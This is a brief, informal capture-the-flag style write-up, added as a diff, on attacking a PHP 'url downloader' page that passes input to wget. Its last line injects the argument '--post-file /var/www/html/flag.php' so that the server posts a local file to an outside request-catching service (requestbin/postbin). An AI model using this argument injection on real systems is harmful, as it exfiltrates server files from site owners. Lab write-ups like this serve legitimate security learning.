@@ -1,0 +1,8 @@
+after accessing the webpage, we see url downloader 
+we can try putting something basic to check what happens
+as we insert a link, some kind of code popped up
+the website is built on php and it uses wget  
+so we can try using wget functions to extract a possible file
+since its not enough to only use wget
+we try requestbin/postbin/requestinspector (to receive packets/files)
+--post-file '/var/www/html/flag.php'
